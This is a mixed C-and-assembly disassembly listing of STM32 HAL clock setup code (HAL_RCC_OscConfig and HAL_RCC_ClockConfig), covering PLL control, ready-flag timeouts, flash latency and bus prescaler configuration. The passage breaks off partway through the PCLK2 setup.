 8003ed2:	f7fd f911 	bl	80010f8 <HAL_GetTick>
 8003ed6:	4602      	mov	r2, r0
 8003ed8:	693b      	ldr	r3, [r7, #16]
 8003eda:	1ad3      	subs	r3, r2, r3
 8003edc:	2b02      	cmp	r3, #2
 8003ede:	d901      	bls.n	8003ee4 <HAL_RCC_OscConfig+0x6e4>
              {
                return HAL_TIMEOUT;
 8003ee0:	2303      	movs	r3, #3
 8003ee2:	e099      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8003ee4:	4b24      	ldr	r3, [pc, #144]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003ee6:	681b      	ldr	r3, [r3, #0]
 8003ee8:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8003eec:	2b00      	cmp	r3, #0
 8003eee:	d1f0      	bne.n	8003ed2 <HAL_RCC_OscConfig+0x6d2>
              }
            }

            /* Configure the main PLL clock source, multiplication and division factors. */
#if defined(RCC_PLLP_SUPPORT)
            __HAL_RCC_PLL_CONFIG(RCC_OscInitStruct->PLL.PLLSource,
 8003ef0:	4b21      	ldr	r3, [pc, #132]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003ef2:	68da      	ldr	r2, [r3, #12]
 8003ef4:	4b21      	ldr	r3, [pc, #132]	; (8003f7c <HAL_RCC_OscConfig+0x77c>)
 8003ef6:	4013      	ands	r3, r2
 8003ef8:	687a      	ldr	r2, [r7, #4]
 8003efa:	6ad1      	ldr	r1, [r2, #44]	; 0x2c
 8003efc:	687a      	ldr	r2, [r7, #4]
 8003efe:	6b12      	ldr	r2, [r2, #48]	; 0x30
 8003f00:	3a01      	subs	r2, #1
 8003f02:	0112      	lsls	r2, r2, #4
 8003f04:	4311      	orrs	r1, r2
 8003f06:	687a      	ldr	r2, [r7, #4]
 8003f08:	6b52      	ldr	r2, [r2, #52]	; 0x34
 8003f0a:	0212      	lsls	r2, r2, #8
 8003f0c:	4311      	orrs	r1, r2
 8003f0e:	687a      	ldr	r2, [r7, #4]
 8003f10:	6bd2      	ldr	r2, [r2, #60]	; 0x3c
 8003f12:	0852      	lsrs	r2, r2, #1
 8003f14:	3a01      	subs	r2, #1
 8003f16:	0552      	lsls	r2, r2, #21
 8003f18:	4311      	orrs	r1, r2
 8003f1a:	687a      	ldr	r2, [r7, #4]
 8003f1c:	6c12      	ldr	r2, [r2, #64]	; 0x40
 8003f1e:	0852      	lsrs	r2, r2, #1
 8003f20:	3a01      	subs	r2, #1
 8003f22:	0652      	lsls	r2, r2, #25
 8003f24:	4311      	orrs	r1, r2
 8003f26:	687a      	ldr	r2, [r7, #4]
 8003f28:	6b92      	ldr	r2, [r2, #56]	; 0x38
 8003f2a:	06d2      	lsls	r2, r2, #27
 8003f2c:	430a      	orrs	r2, r1
 8003f2e:	4912      	ldr	r1, [pc, #72]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003f30:	4313      	orrs	r3, r2
 8003f32:	60cb      	str	r3, [r1, #12]
                                 RCC_OscInitStruct->PLL.PLLQ,
                                 RCC_OscInitStruct->PLL.PLLR);
#endif

            /* Enable the main PLL. */
            __HAL_RCC_PLL_ENABLE();
 8003f34:	4b10      	ldr	r3, [pc, #64]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003f36:	681b      	ldr	r3, [r3, #0]
 8003f38:	4a0f      	ldr	r2, [pc, #60]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003f3a:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 8003f3e:	6013      	str	r3, [r2, #0]

            /* Enable PLL System Clock output. */
            __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SYSCLK);
 8003f40:	4b0d      	ldr	r3, [pc, #52]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003f42:	68db      	ldr	r3, [r3, #12]
 8003f44:	4a0c      	ldr	r2, [pc, #48]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003f46:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 8003f4a:	60d3      	str	r3, [r2, #12]

            /* Get Start Tick*/
            tickstart = HAL_GetTick();
 8003f4c:	f7fd f8d4 	bl	80010f8 <HAL_GetTick>
 8003f50:	6138      	str	r0, [r7, #16]

            /* Wait till PLL is ready */
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8003f52:	e008      	b.n	8003f66 <HAL_RCC_OscConfig+0x766>
            {
              if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8003f54:	f7fd f8d0 	bl	80010f8 <HAL_GetTick>
 8003f58:	4602      	mov	r2, r0
 8003f5a:	693b      	ldr	r3, [r7, #16]
 8003f5c:	1ad3      	subs	r3, r2, r3
 8003f5e:	2b02      	cmp	r3, #2
 8003f60:	d901      	bls.n	8003f66 <HAL_RCC_OscConfig+0x766>
              {
                return HAL_TIMEOUT;
 8003f62:	2303      	movs	r3, #3
 8003f64:	e058      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8003f66:	4b04      	ldr	r3, [pc, #16]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003f68:	681b      	ldr	r3, [r3, #0]
 8003f6a:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8003f6e:	2b00      	cmp	r3, #0
 8003f70:	d0f0      	beq.n	8003f54 <HAL_RCC_OscConfig+0x754>
        if(sysclk_source != RCC_CFGR_SWS_PLL)
 8003f72:	e050      	b.n	8004016 <HAL_RCC_OscConfig+0x816>
          }
        }
        else
        {
          /* PLL is already used as System core clock */
          return HAL_ERROR;
 8003f74:	2301      	movs	r3, #1
 8003f76:	e04f      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
 8003f78:	40021000 	.word	0x40021000
 8003f7c:	019d808c 	.word	0x019d808c
      }
      else
      {
        /* PLL configuration is unchanged */
        /* Re-enable PLL if it was disabled (ie. low power mode) */
        if(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8003f80:	4b27      	ldr	r3, [pc, #156]	; (8004020 <HAL_RCC_OscConfig+0x820>)
 8003f82:	681b      	ldr	r3, [r3, #0]
 8003f84:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8003f88:	2b00      	cmp	r3, #0
 8003f8a:	d144      	bne.n	8004016 <HAL_RCC_OscConfig+0x816>
        {
          /* Enable the main PLL. */
          __HAL_RCC_PLL_ENABLE();
 8003f8c:	4b24      	ldr	r3, [pc, #144]	; (8004020 <HAL_RCC_OscConfig+0x820>)
 8003f8e:	681b      	ldr	r3, [r3, #0]
 8003f90:	4a23      	ldr	r2, [pc, #140]	; (8004020 <HAL_RCC_OscConfig+0x820>)
 8003f92:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 8003f96:	6013      	str	r3, [r2, #0]

          /* Enable PLL System Clock output. */
          __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SYSCLK);
 8003f98:	4b21      	ldr	r3, [pc, #132]	; (8004020 <HAL_RCC_OscConfig+0x820>)
 8003f9a:	68db      	ldr	r3, [r3, #12]
 8003f9c:	4a20      	ldr	r2, [pc, #128]	; (8004020 <HAL_RCC_OscConfig+0x820>)
 8003f9e:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 8003fa2:	60d3      	str	r3, [r2, #12]

          /* Get Start Tick*/
          tickstart = HAL_GetTick();
 8003fa4:	f7fd f8a8 	bl	80010f8 <HAL_GetTick>
 8003fa8:	6138      	str	r0, [r7, #16]

          /* Wait till PLL is ready */
          while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8003faa:	e008      	b.n	8003fbe <HAL_RCC_OscConfig+0x7be>
          {
            if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8003fac:	f7fd f8a4 	bl	80010f8 <HAL_GetTick>
 8003fb0:	4602      	mov	r2, r0
 8003fb2:	693b      	ldr	r3, [r7, #16]
 8003fb4:	1ad3      	subs	r3, r2, r3
 8003fb6:	2b02      	cmp	r3, #2
 8003fb8:	d901      	bls.n	8003fbe <HAL_RCC_OscConfig+0x7be>
            {
              return HAL_TIMEOUT;
 8003fba:	2303      	movs	r3, #3
 8003fbc:	e02c      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
          while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8003fbe:	4b18      	ldr	r3, [pc, #96]	; (8004020 <HAL_RCC_OscConfig+0x820>)
 8003fc0:	681b      	ldr	r3, [r3, #0]
 8003fc2:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8003fc6:	2b00      	cmp	r3, #0
 8003fc8:	d0f0      	beq.n	8003fac <HAL_RCC_OscConfig+0x7ac>
 8003fca:	e024      	b.n	8004016 <HAL_RCC_OscConfig+0x816>
      }
    }
    else
    {
      /* Check that PLL is not used as system clock or not */
      if(sysclk_source != RCC_CFGR_SWS_PLL)
 8003fcc:	69bb      	ldr	r3, [r7, #24]
 8003fce:	2b0c      	cmp	r3, #12
 8003fd0:	d01f      	beq.n	8004012 <HAL_RCC_OscConfig+0x812>
      {
        /* Disable the main PLL. */
        __HAL_RCC_PLL_DISABLE();
 8003fd2:	4b13      	ldr	r3, [pc, #76]	; (8004020 <HAL_RCC_OscConfig+0x820>)
 8003fd4:	681b      	ldr	r3, [r3, #0]
 8003fd6:	4a12      	ldr	r2, [pc, #72]	; (8004020 <HAL_RCC_OscConfig+0x820>)
 8003fd8:	f023 7380 	bic.w	r3, r3, #16777216	; 0x1000000
 8003fdc:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003fde:	f7fd f88b 	bl	80010f8 <HAL_GetTick>
 8003fe2:	6138      	str	r0, [r7, #16]

        /* Wait till PLL is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8003fe4:	e008      	b.n	8003ff8 <HAL_RCC_OscConfig+0x7f8>
        {
          if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8003fe6:	f7fd f887 	bl	80010f8 <HAL_GetTick>
 8003fea:	4602      	mov	r2, r0
 8003fec:	693b      	ldr	r3, [r7, #16]
 8003fee:	1ad3      	subs	r3, r2, r3
 8003ff0:	2b02      	cmp	r3, #2
 8003ff2:	d901      	bls.n	8003ff8 <HAL_RCC_OscConfig+0x7f8>
          {
            return HAL_TIMEOUT;
 8003ff4:	2303      	movs	r3, #3
 8003ff6:	e00f      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8003ff8:	4b09      	ldr	r3, [pc, #36]	; (8004020 <HAL_RCC_OscConfig+0x820>)
 8003ffa:	681b      	ldr	r3, [r3, #0]
 8003ffc:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004000:	2b00      	cmp	r3, #0
 8004002:	d1f0      	bne.n	8003fe6 <HAL_RCC_OscConfig+0x7e6>
        }
        /* Unselect main PLL clock source and disable main PLL outputs to save power */
#if defined(RCC_PLLSAI2_SUPPORT)
        RCC->PLLCFGR &= ~(RCC_PLLCFGR_PLLSRC | RCC_PLL_SYSCLK | RCC_PLL_48M1CLK | RCC_PLL_SAI3CLK);
#elif defined(RCC_PLLSAI1_SUPPORT)
        RCC->PLLCFGR &= ~(RCC_PLLCFGR_PLLSRC | RCC_PLL_SYSCLK | RCC_PLL_48M1CLK | RCC_PLL_SAI2CLK);
 8004004:	4b06      	ldr	r3, [pc, #24]	; (8004020 <HAL_RCC_OscConfig+0x820>)
 8004006:	68da      	ldr	r2, [r3, #12]
 8004008:	4905      	ldr	r1, [pc, #20]	; (8004020 <HAL_RCC_OscConfig+0x820>)
 800400a:	4b06      	ldr	r3, [pc, #24]	; (8004024 <HAL_RCC_OscConfig+0x824>)
 800400c:	4013      	ands	r3, r2
 800400e:	60cb      	str	r3, [r1, #12]
 8004010:	e001      	b.n	8004016 <HAL_RCC_OscConfig+0x816>
#endif /* RCC_PLLSAI2_SUPPORT */
      }
      else
      {
        /* PLL is already used as System core clock */
        return HAL_ERROR;
 8004012:	2301      	movs	r3, #1
 8004014:	e000      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
      }
    }
  }
  return HAL_OK;
 8004016:	2300      	movs	r3, #0
}
 8004018:	4618      	mov	r0, r3
 800401a:	3720      	adds	r7, #32
 800401c:	46bd      	mov	sp, r7
 800401e:	bd80      	pop	{r7, pc}
 8004020:	40021000 	.word	0x40021000
 8004024:	feeefffc 	.word	0xfeeefffc

08004028 <HAL_RCC_ClockConfig>:
  *         HPRE[3:0] bits to ensure that HCLK not exceed the maximum allowed frequency
  *         (for more details refer to section above "Initialization/de-initialization functions")
  * @retval None
  */
HAL_StatusTypeDef HAL_RCC_ClockConfig(RCC_ClkInitTypeDef  *RCC_ClkInitStruct, uint32_t FLatency)
{
 8004028:	b580      	push	{r7, lr}
 800402a:	b084      	sub	sp, #16
 800402c:	af00      	add	r7, sp, #0
 800402e:	6078      	str	r0, [r7, #4]
 8004030:	6039      	str	r1, [r7, #0]
  uint32_t hpre = RCC_SYSCLK_DIV1;
#endif
  HAL_StatusTypeDef status;

  /* Check Null pointer */
  if(RCC_ClkInitStruct == NULL)
 8004032:	687b      	ldr	r3, [r7, #4]
 8004034:	2b00      	cmp	r3, #0
 8004036:	d101      	bne.n	800403c <HAL_RCC_ClockConfig+0x14>
  {
    return HAL_ERROR;
 8004038:	2301      	movs	r3, #1
 800403a:	e0e7      	b.n	800420c <HAL_RCC_ClockConfig+0x1e4>
  /* To correctly read data from FLASH memory, the number of wait states (LATENCY)
    must be correctly programmed according to the frequency of the CPU clock
    (HCLK) and the supply voltage of the device. */

  /* Increasing the number of wait states because of higher CPU frequency */
  if(FLatency > __HAL_FLASH_GET_LATENCY())
 800403c:	4b75      	ldr	r3, [pc, #468]	; (8004214 <HAL_RCC_ClockConfig+0x1ec>)
 800403e:	681b      	ldr	r3, [r3, #0]
 8004040:	f003 0307 	and.w	r3, r3, #7
 8004044:	683a      	ldr	r2, [r7, #0]
 8004046:	429a      	cmp	r2, r3
 8004048:	d910      	bls.n	800406c <HAL_RCC_ClockConfig+0x44>
  {
    /* Program the new number of wait states to the LATENCY bits in the FLASH_ACR register */
    __HAL_FLASH_SET_LATENCY(FLatency);
 800404a:	4b72      	ldr	r3, [pc, #456]	; (8004214 <HAL_RCC_ClockConfig+0x1ec>)
 800404c:	681b      	ldr	r3, [r3, #0]
 800404e:	f023 0207 	bic.w	r2, r3, #7
 8004052:	4970      	ldr	r1, [pc, #448]	; (8004214 <HAL_RCC_ClockConfig+0x1ec>)
 8004054:	683b      	ldr	r3, [r7, #0]
 8004056:	4313      	orrs	r3, r2
 8004058:	600b      	str	r3, [r1, #0]

    /* Check that the new number of wait states is taken into account to access the Flash
    memory by reading the FLASH_ACR register */
    if(__HAL_FLASH_GET_LATENCY() != FLatency)
 800405a:	4b6e      	ldr	r3, [pc, #440]	; (8004214 <HAL_RCC_ClockConfig+0x1ec>)
 800405c:	681b      	ldr	r3, [r3, #0]
 800405e:	f003 0307 	and.w	r3, r3, #7
 8004062:	683a      	ldr	r2, [r7, #0]
 8004064:	429a      	cmp	r2, r3
 8004066:	d001      	beq.n	800406c <HAL_RCC_ClockConfig+0x44>
    {
      return HAL_ERROR;
 8004068:	2301      	movs	r3, #1
 800406a:	e0cf      	b.n	800420c <HAL_RCC_ClockConfig+0x1e4>
    }
  }

  /*----------------- HCLK Configuration prior to SYSCLK----------------------*/
  /* Apply higher HCLK prescaler request here to ensure CPU clock is not of of spec when SYSCLK is increased */
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_HCLK) == RCC_CLOCKTYPE_HCLK)
 800406c:	687b      	ldr	r3, [r7, #4]
 800406e:	681b      	ldr	r3, [r3, #0]
 8004070:	f003 0302 	and.w	r3, r3, #2
 8004074:	2b00      	cmp	r3, #0
 8004076:	d010      	beq.n	800409a <HAL_RCC_ClockConfig+0x72>
  {
    assert_param(IS_RCC_HCLK(RCC_ClkInitStruct->AHBCLKDivider));

    if(RCC_ClkInitStruct->AHBCLKDivider > READ_BIT(RCC->CFGR, RCC_CFGR_HPRE))
 8004078:	687b      	ldr	r3, [r7, #4]
 800407a:	689a      	ldr	r2, [r3, #8]
 800407c:	4b66      	ldr	r3, [pc, #408]	; (8004218 <HAL_RCC_ClockConfig+0x1f0>)
 800407e:	689b      	ldr	r3, [r3, #8]
 8004080:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8004084:	429a      	cmp	r2, r3
 8004086:	d908      	bls.n	800409a <HAL_RCC_ClockConfig+0x72>
    {
      MODIFY_REG(RCC->CFGR, RCC_CFGR_HPRE, RCC_ClkInitStruct->AHBCLKDivider);
 8004088:	4b63      	ldr	r3, [pc, #396]	; (8004218 <HAL_RCC_ClockConfig+0x1f0>)
 800408a:	689b      	ldr	r3, [r3, #8]
 800408c:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8004090:	687b      	ldr	r3, [r7, #4]
 8004092:	689b      	ldr	r3, [r3, #8]
 8004094:	4960      	ldr	r1, [pc, #384]	; (8004218 <HAL_RCC_ClockConfig+0x1f0>)
 8004096:	4313      	orrs	r3, r2
 8004098:	608b      	str	r3, [r1, #8]
    }
  }

  /*------------------------- SYSCLK Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_SYSCLK) == RCC_CLOCKTYPE_SYSCLK)
 800409a:	687b      	ldr	r3, [r7, #4]
 800409c:	681b      	ldr	r3, [r3, #0]
 800409e:	f003 0301 	and.w	r3, r3, #1
 80040a2:	2b00      	cmp	r3, #0
 80040a4:	d04c      	beq.n	8004140 <HAL_RCC_ClockConfig+0x118>
  {
    assert_param(IS_RCC_SYSCLKSOURCE(RCC_ClkInitStruct->SYSCLKSource));

    /* PLL is selected as System Clock Source */
    if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_PLLCLK)
 80040a6:	687b      	ldr	r3, [r7, #4]
 80040a8:	685b      	ldr	r3, [r3, #4]
 80040aa:	2b03      	cmp	r3, #3
 80040ac:	d107      	bne.n	80040be <HAL_RCC_ClockConfig+0x96>
    {
      /* Check the PLL ready flag */
      if(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 80040ae:	4b5a      	ldr	r3, [pc, #360]	; (8004218 <HAL_RCC_ClockConfig+0x1f0>)
 80040b0:	681b      	ldr	r3, [r3, #0]
 80040b2:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 80040b6:	2b00      	cmp	r3, #0
 80040b8:	d121      	bne.n	80040fe <HAL_RCC_ClockConfig+0xd6>
      {
        return HAL_ERROR;
 80040ba:	2301      	movs	r3, #1
 80040bc:	e0a6      	b.n	800420c <HAL_RCC_ClockConfig+0x1e4>
#endif
    }
    else
    {
      /* HSE is selected as System Clock Source */
      if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_HSE)
 80040be:	687b      	ldr	r3, [r7, #4]
 80040c0:	685b      	ldr	r3, [r3, #4]
 80040c2:	2b02      	cmp	r3, #2
 80040c4:	d107      	bne.n	80040d6 <HAL_RCC_ClockConfig+0xae>
      {
        /* Check the HSE ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 80040c6:	4b54      	ldr	r3, [pc, #336]	; (8004218 <HAL_RCC_ClockConfig+0x1f0>)
 80040c8:	681b      	ldr	r3, [r3, #0]
 80040ca:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 80040ce:	2b00      	cmp	r3, #0
 80040d0:	d115      	bne.n	80040fe <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 80040d2:	2301      	movs	r3, #1
 80040d4:	e09a      	b.n	800420c <HAL_RCC_ClockConfig+0x1e4>
        }
      }
      /* MSI is selected as System Clock Source */
      else if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_MSI)
 80040d6:	687b      	ldr	r3, [r7, #4]
 80040d8:	685b      	ldr	r3, [r3, #4]
 80040da:	2b00      	cmp	r3, #0
 80040dc:	d107      	bne.n	80040ee <HAL_RCC_ClockConfig+0xc6>
      {
        /* Check the MSI ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 80040de:	4b4e      	ldr	r3, [pc, #312]	; (8004218 <HAL_RCC_ClockConfig+0x1f0>)
 80040e0:	681b      	ldr	r3, [r3, #0]
 80040e2:	f003 0302 	and.w	r3, r3, #2
 80040e6:	2b00      	cmp	r3, #0
 80040e8:	d109      	bne.n	80040fe <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 80040ea:	2301      	movs	r3, #1
 80040ec:	e08e      	b.n	800420c <HAL_RCC_ClockConfig+0x1e4>
      }
      /* HSI is selected as System Clock Source */
      else
      {
        /* Check the HSI ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 80040ee:	4b4a      	ldr	r3, [pc, #296]	; (8004218 <HAL_RCC_ClockConfig+0x1f0>)
 80040f0:	681b      	ldr	r3, [r3, #0]
 80040f2:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80040f6:	2b00      	cmp	r3, #0
 80040f8:	d101      	bne.n	80040fe <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 80040fa:	2301      	movs	r3, #1
 80040fc:	e086      	b.n	800420c <HAL_RCC_ClockConfig+0x1e4>
      }
#endif

    }

    MODIFY_REG(RCC->CFGR, RCC_CFGR_SW, RCC_ClkInitStruct->SYSCLKSource);
 80040fe:	4b46      	ldr	r3, [pc, #280]	; (8004218 <HAL_RCC_ClockConfig+0x1f0>)
 8004100:	689b      	ldr	r3, [r3, #8]
 8004102:	f023 0203 	bic.w	r2, r3, #3
 8004106:	687b      	ldr	r3, [r7, #4]
 8004108:	685b      	ldr	r3, [r3, #4]
 800410a:	4943      	ldr	r1, [pc, #268]	; (8004218 <HAL_RCC_ClockConfig+0x1f0>)
 800410c:	4313      	orrs	r3, r2
 800410e:	608b      	str	r3, [r1, #8]

    /* Get Start Tick*/
    tickstart = HAL_GetTick();
 8004110:	f7fc fff2 	bl	80010f8 <HAL_GetTick>
 8004114:	60f8      	str	r0, [r7, #12]

    while(__HAL_RCC_GET_SYSCLK_SOURCE() != (RCC_ClkInitStruct->SYSCLKSource << RCC_CFGR_SWS_Pos))
 8004116:	e00a      	b.n	800412e <HAL_RCC_ClockConfig+0x106>
    {
      if((HAL_GetTick() - tickstart) > CLOCKSWITCH_TIMEOUT_VALUE)
 8004118:	f7fc ffee 	bl	80010f8 <HAL_GetTick>
 800411c:	4602      	mov	r2, r0
 800411e:	68fb      	ldr	r3, [r7, #12]
 8004120:	1ad3      	subs	r3, r2, r3
 8004122:	f241 3288 	movw	r2, #5000	; 0x1388
 8004126:	4293      	cmp	r3, r2
 8004128:	d901      	bls.n	800412e <HAL_RCC_ClockConfig+0x106>
      {
        return HAL_TIMEOUT;
 800412a:	2303      	movs	r3, #3
 800412c:	e06e      	b.n	800420c <HAL_RCC_ClockConfig+0x1e4>
    while(__HAL_RCC_GET_SYSCLK_SOURCE() != (RCC_ClkInitStruct->SYSCLKSource << RCC_CFGR_SWS_Pos))
 800412e:	4b3a      	ldr	r3, [pc, #232]	; (8004218 <HAL_RCC_ClockConfig+0x1f0>)
 8004130:	689b      	ldr	r3, [r3, #8]
 8004132:	f003 020c 	and.w	r2, r3, #12
 8004136:	687b      	ldr	r3, [r7, #4]
 8004138:	685b      	ldr	r3, [r3, #4]
 800413a:	009b      	lsls	r3, r3, #2
 800413c:	429a      	cmp	r2, r3
 800413e:	d1eb      	bne.n	8004118 <HAL_RCC_ClockConfig+0xf0>
  }
#endif

  /*----------------- HCLK Configuration after SYSCLK-------------------------*/
  /* Apply lower HCLK prescaler request here to ensure CPU clock is not of of spec when SYSCLK is set */
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_HCLK) == RCC_CLOCKTYPE_HCLK)
 8004140:	687b      	ldr	r3, [r7, #4]
 8004142:	681b      	ldr	r3, [r3, #0]
 8004144:	f003 0302 	and.w	r3, r3, #2
 8004148:	2b00      	cmp	r3, #0
 800414a:	d010      	beq.n	800416e <HAL_RCC_ClockConfig+0x146>
  {
    if(RCC_ClkInitStruct->AHBCLKDivider < READ_BIT(RCC->CFGR, RCC_CFGR_HPRE))
 800414c:	687b      	ldr	r3, [r7, #4]
 800414e:	689a      	ldr	r2, [r3, #8]
 8004150:	4b31      	ldr	r3, [pc, #196]	; (8004218 <HAL_RCC_ClockConfig+0x1f0>)
 8004152:	689b      	ldr	r3, [r3, #8]
 8004154:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8004158:	429a      	cmp	r2, r3
 800415a:	d208      	bcs.n	800416e <HAL_RCC_ClockConfig+0x146>
    {
      MODIFY_REG(RCC->CFGR, RCC_CFGR_HPRE, RCC_ClkInitStruct->AHBCLKDivider);
 800415c:	4b2e      	ldr	r3, [pc, #184]	; (8004218 <HAL_RCC_ClockConfig+0x1f0>)
 800415e:	689b      	ldr	r3, [r3, #8]
 8004160:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8004164:	687b      	ldr	r3, [r7, #4]
 8004166:	689b      	ldr	r3, [r3, #8]
 8004168:	492b      	ldr	r1, [pc, #172]	; (8004218 <HAL_RCC_ClockConfig+0x1f0>)
 800416a:	4313      	orrs	r3, r2
 800416c:	608b      	str	r3, [r1, #8]
    }
  }

  /* Allow decreasing of the number of wait states (because of lower CPU frequency expected) */
  if(FLatency < __HAL_FLASH_GET_LATENCY())
 800416e:	4b29      	ldr	r3, [pc, #164]	; (8004214 <HAL_RCC_ClockConfig+0x1ec>)
 8004170:	681b      	ldr	r3, [r3, #0]
 8004172:	f003 0307 	and.w	r3, r3, #7
 8004176:	683a      	ldr	r2, [r7, #0]
 8004178:	429a      	cmp	r2, r3
 800417a:	d210      	bcs.n	800419e <HAL_RCC_ClockConfig+0x176>
  {
    /* Program the new number of wait states to the LATENCY bits in the FLASH_ACR register */
    __HAL_FLASH_SET_LATENCY(FLatency);
 800417c:	4b25      	ldr	r3, [pc, #148]	; (8004214 <HAL_RCC_ClockConfig+0x1ec>)
 800417e:	681b      	ldr	r3, [r3, #0]
 8004180:	f023 0207 	bic.w	r2, r3, #7
 8004184:	4923      	ldr	r1, [pc, #140]	; (8004214 <HAL_RCC_ClockConfig+0x1ec>)
 8004186:	683b      	ldr	r3, [r7, #0]
 8004188:	4313      	orrs	r3, r2
 800418a:	600b      	str	r3, [r1, #0]

    /* Check that the new number of wait states is taken into account to access the Flash
    memory by reading the FLASH_ACR register */
    if(__HAL_FLASH_GET_LATENCY() != FLatency)
 800418c:	4b21      	ldr	r3, [pc, #132]	; (8004214 <HAL_RCC_ClockConfig+0x1ec>)
 800418e:	681b      	ldr	r3, [r3, #0]
 8004190:	f003 0307 	and.w	r3, r3, #7
 8004194:	683a      	ldr	r2, [r7, #0]
 8004196:	429a      	cmp	r2, r3
 8004198:	d001      	beq.n	800419e <HAL_RCC_ClockConfig+0x176>
    {
      return HAL_ERROR;
 800419a:	2301      	movs	r3, #1
 800419c:	e036      	b.n	800420c <HAL_RCC_ClockConfig+0x1e4>
    }
  }

  /*-------------------------- PCLK1 Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK1) == RCC_CLOCKTYPE_PCLK1)
 800419e:	687b      	ldr	r3, [r7, #4]
 80041a0:	681b      	ldr	r3, [r3, #0]
 80041a2:	f003 0304 	and.w	r3, r3, #4
 80041a6:	2b00      	cmp	r3, #0
 80041a8:	d008      	beq.n	80041bc <HAL_RCC_ClockConfig+0x194>
  {
    assert_param(IS_RCC_PCLK(RCC_ClkInitStruct->APB1CLKDivider));
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE1, RCC_ClkInitStruct->APB1CLKDivider);
 80041aa:	4b1b      	ldr	r3, [pc, #108]	; (8004218 <HAL_RCC_ClockConfig+0x1f0>)
 80041ac:	689b      	ldr	r3, [r3, #8]
 80041ae:	f423 62e0 	bic.w	r2, r3, #1792	; 0x700
 80041b2:	687b      	ldr	r3, [r7, #4]
 80041b4:	68db      	ldr	r3, [r3, #12]
 80041b6:	4918      	ldr	r1, [pc, #96]	; (8004218 <HAL_RCC_ClockConfig+0x1f0>)
 80041b8:	4313      	orrs	r3, r2
 80041ba:	608b      	str	r3, [r1, #8]
  }

  /*-------------------------- PCLK2 Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK2) == RCC_CLOCKTYPE_PCLK2)
 80041bc:	687b      	ldr	r3, [r7, #4]
 80041be:	681b      	ldr	r3, [r3, #0]
 80041c0:	f003 0308 	and.w	r3, r3, #8
 80041c4:	2b00      	cmp	r3, #0
 80041c6:	d009      	beq.n	80041dc <HAL_RCC_ClockConfig+0x1b4>
  {
    assert_param(IS_RCC_PCLK(RCC_ClkInitStruct->APB2CLKDivider));
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE2, ((RCC_ClkInitStruct->APB2CLKDivider) << 3U));
 80041c8:	4b13      	ldr	r3, [pc, #76]	; (8004218 <HAL_RCC_ClockConfig+0x1f0>)
 80041ca:	689b      	ldr	r3, [r3, #8]
 80041cc:	f423 5260 	bic.w	r2, r3, #14336	; 0x3800
 80041d0:	687b      	ldr	r3, [r7, #4]
 80041d2:	691b      	ldr	r3, [r3, #16]
